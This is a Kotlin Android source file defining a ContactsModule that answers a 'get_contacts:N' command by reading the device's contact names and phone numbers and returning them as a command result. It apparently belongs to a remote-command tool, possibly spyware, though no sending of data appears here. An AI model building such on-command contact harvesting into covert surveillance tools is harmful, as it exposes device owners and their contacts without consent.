package com.nexlink.bridge.modules

import android.content.Context
import android.provider.ContactsContract

internal object ContactsModule {
    fun execute(ctx: Context, command: String): Pair<String, String> {
        val limit = command.substringAfter("get_contacts:", "").toIntOrNull() ?: 200
        return Pair(getContacts(ctx, limit), "command_result")
    }
    private fun getContacts(ctx: Context, limit: Int): String {
        return try {
            val cur = ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                arrayOf(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER),
                null, null,
                "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
            ) ?: return "⚠️ Cannot read contacts"
            val sb = StringBuilder("=== Contacts (limit $limit) ===\n")
            var n  = 0
            cur.use {
                while (it.moveToNext() && n < limit) {
                    sb.appendLine("${it.getString(0) ?: "?"} | ${it.getString(1) ?: "?"}")
                    n++
                }
            }
            if (n == 0) sb.append("No contacts") else sb.appendLine("\nTotal: $n")
            sb.toString()
        } catch (e: Exception) { "Error: ${e.message}" }
    }
}
